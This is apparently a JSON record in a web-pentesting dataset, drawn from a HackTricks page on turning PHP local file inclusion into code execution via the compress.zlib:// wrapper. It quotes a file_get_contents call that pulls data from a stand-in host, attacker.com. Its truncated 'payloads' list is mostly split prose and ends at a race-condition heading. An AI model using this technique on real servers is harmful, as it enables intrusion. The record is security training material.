{
  "id": "pentesting_web_d7c889d6b322",
  "category": "pentesting-web",
  "title": "lfi2rce via compress.zlib + php stream prefer studio + path disclosure",
  "description": "# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure\n\n{{#include ../../banners/hacktricks-training.md}}\n\n### `compress.zlib://` and `PHP_STREAM_PREFER_STDIO`\n\nA file opened using the protocol `compress.zlib://` with the flag `PHP_STREAM_PREFER_STDIO` can continue writing data that arrives to the connection later to the same file.\n\nThis means that a call such as:\n\n```php\nfile_get_contents(\"compress.zlib://http://attacker.com/file\")\n```\n\nWill send a request asking for http://at",
  "payloads": [
    "# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure",
    "{{#include ../../banners/hacktricks-training.md}}",
    "### `compress.zlib://` and `PHP_STREAM_PREFER_STDIO`",
    "A file opened using the protocol `compress.zlib://` with the flag `PHP_STREAM_PREFER_STDIO` can continue writing data that arrives to the connection later to the same file.",
    "This means that a call such as:",
    "```php",
    "file_get_contents(\"compress.zlib://http://attacker.com/file\")",
    "Will send a request asking for http://attacker.com/file, then the server might respond the request with a valid HTTP response, keep the connection open, and send extra data some time later that will be also written into the file.",
    "You can see that info in this part of the php-src code in main/streams/cast.c:",
    "/* Use a tmpfile and copy the old streams contents into it */",
    "if (flags & PHP_STREAM_PREFER_STDIO) {",
    "*newstream = php_stream_fopen_tmpfile();",
    "} else {",
    "*newstream = php_stream_temp_new();",
    "### Race Condition to RCE"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md"
  ]
}